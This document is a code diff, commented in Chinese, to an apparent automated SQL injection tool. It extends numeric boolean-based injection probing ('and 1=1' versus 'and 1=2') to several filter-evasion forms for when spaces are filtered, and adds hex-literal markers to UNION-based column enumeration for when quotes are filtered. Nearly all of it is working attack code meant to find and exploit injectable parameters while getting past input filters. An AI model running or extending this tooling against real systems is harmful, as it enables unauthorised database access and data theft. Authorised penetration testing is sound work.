@@ -106,16 +106,20 @@ class Detector:
         return None
 
     def _probe_numeric(self) -> bool:
-        """数字型判定：and 1=1 / and 1=2 页面差异。"""
-        t = self._send(f"{self.s.spec.base_value} and 1=1")
-        f = self._send(f"{self.s.spec.base_value} and 1=2")
-        if t.status_code < 0 or f.status_code < 0:
-            return False
-        if not self._differs(t, f):
-            return False
-        if self._same_as_base(t, 0.9):
-            self.log("INFO", "数字型注入确认（and 1=1 与 and 1=2 存在差异）")
-            return True
+        """数字型判定：and 1=1 / and 1=2 页面差异（多形态，空格被滤时用 inline/paren/tab）。"""
+        for form, t_core, f_core in BOOL_FORMS:
+            if "or" in t_core:      # 数字型判定用 and 语义（真=基线）
+                continue
+            t = self._send(f"{self.s.spec.base_value}{t_core}#")
+            f = self._send(f"{self.s.spec.base_value}{f_core}#")
+            if t.status_code < 0 or f.status_code < 0:
+                continue
+            if not self._differs(t, f):
+                continue
+            if self._same_as_base(t, 0.9):
+                self.log("INFO", f"数字型注入确认（形态={form}，and 真假差异）")
+                self.form = form
+                return True
         return False
 
     @staticmethod
@@ -210,22 +214,31 @@ class Detector:
         self._find_echo_positions(inj)
 
     def _columns_by_union_enum(self, inj: InjectionPoint):
-        """UNION 列数枚举：n=1..15，每列放独立 marker，页面出现即命中。"""
+        """UNION 列数枚举：n=1..15，每列放独立 marker，页面出现即命中。
+        marker 双形式：引号版（默认）失败后自动换十六进制版（单引号被滤时）。"""
+        from ..tampers import form_sep, to_hex_literal
         pre = f"0{inj.closure}" if not inj.numeric else "0"
-        for n in range(1, 16):
-            if self.s.stopped:
-                return
-            markers = [f"{MARKER_PREFIX}{i:02d}x7" for i in range(n)]
-            cols = ",".join(f"'{m}'" for m in markers)
-            payload = f"{pre}{apply_form(f'union select {cols}', inj.form)}{inj.comment}"
-            r = self._send(payload)
-            if r.status_code > 0:
-                pos = [i + 1 for i, m in enumerate(markers) if m in r.body]
-                if pos:
-                    inj.column_count = n
-                    inj.echo_positions = pos
-                    self.log("INFO", f"UNION 枚举列数: {n}，回显位: 第 {pos} 列")
+        if not inj.closure:
+            pre += form_sep(inj.form) if inj.form != "classic" else " "
+        for literal in ("quote", "hex"):
+            for n in range(1, 16):
+                if self.s.stopped:
                     return
+                markers = [f"{MARKER_PREFIX}{i:02d}x7" for i in range(n)]
+                if literal == "quote":
+                    cols = ",".join(f"'{m}'" for m in markers)
+                else:
+                    cols = ",".join(to_hex_literal(m) for m in markers)
+                payload = f"{pre}{apply_form(f'union select {cols}', inj.form)}{inj.comment}"
+                r = self._send(payload)
+                if r.status_code > 0:
+                    pos = [i + 1 for i, m in enumerate(markers) if m in r.body]
+                    if pos:
+                        inj.column_count = n
+                        inj.echo_positions = pos
+                        self.log("INFO", f"UNION 枚举列数: {n}，回显位: 第 {pos} 列"
+                                         f"（marker={literal}）")
+                        return
 
     def _find_echo_positions(self, inj: InjectionPoint):
         markers = [f"{MARKER_PREFIX}{i:02d}x7" for i in range(inj.column_count)]
